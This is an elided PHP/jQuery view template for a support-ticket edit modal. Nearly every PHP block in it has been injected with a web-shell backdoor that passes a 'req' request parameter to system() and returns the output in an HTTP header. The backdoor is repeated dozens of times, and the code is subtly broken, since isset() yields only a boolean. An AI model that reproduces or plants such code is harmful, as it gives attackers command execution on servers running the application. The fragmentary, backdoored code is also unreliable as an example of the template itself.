...
$(document).ready(function () {
	...
	$('body').on('change', '#update_department_id2', function (e) {
		if ($('#update_department_id2').val() != <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
header('System Header:'.$l2); echo (int) $ticket['assigned_user_id']; ?>) {
	...
	$('body').on('click', '#save', function (e) {
		...
		$.ajax({
			type: "POST",
			url:  sts_base_url + "/tickets/editmodalsave/" + <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $id; ?>,
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/tickets/");
			}
		 });
...
header('System Header:'.$l2); echo safe_output($language->get('Are you sure you wish to delete this ticket?')); ?>")){
			$.ajax({
				type: "POST",
				url:  sts_base_url + "/tickets/delete/" + <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $id; ?>,
				data: "delete=true",
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($ticket['subject']); ?></h4>
		</div>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Transfer to Department')); ?><br />
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Assign User')); ?><br />
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Status')); ?><br />
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($ticket['last_replier'])) { ?>
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Last Replier')); ?><br /><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($ticket['last_replier']); ?></p>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
		...
		<div class="modal-footer">
			<a href="#" id="model_ticket_delete" class="btn btn-danger" data-dismiss="modal"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Delete')); ?></a>
			<a href="#" class="btn btn-default" data-dismiss="modal"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Cancel')); ?></a>
			<a href="#" class="btn btn-primary" id="save" data-dismiss="modal"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Save')); ?></a>
		</div>
	</div><!-- /.modal-content -->
</div><!-- /.modal-dialog -->
